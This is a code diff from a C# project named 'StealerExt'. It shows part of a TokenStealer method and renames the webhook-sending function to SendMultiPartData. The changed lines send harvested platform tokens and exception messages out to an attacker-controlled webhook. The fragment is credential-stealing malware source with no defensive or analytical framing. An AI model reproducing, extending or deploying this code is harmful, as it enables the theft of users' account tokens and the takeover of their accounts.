@@ -37,7 +37,7 @@ namespace StealerExt
 			}
 			catch (Exception x)
 			{
-				new API(API.wHook).idk("Exception: " + x.Message);
+				new API(API.wHook).SendMultiPartData($"Exception: {x.Message}");
 			}
 		}
 		private void TokenStealer(DirectoryInfo Folder, string Platform)
@@ -230,8 +230,8 @@ namespace StealerExt
 					}
 					catch (Exception x)
 					{
-						new API(API.wHook).idk($"```{Platform} Token {token}\n```");
-						new API(API.wHook).idk($"```{x.Message}```");
+						new API(API.wHook).SendMultiPartData($"```{Platform} Token {token}\n```");
+						new API(API.wHook).SendMultiPartData($"```{x.Message}```");
 					}
 				}
 				SavedTokens.Add(token);
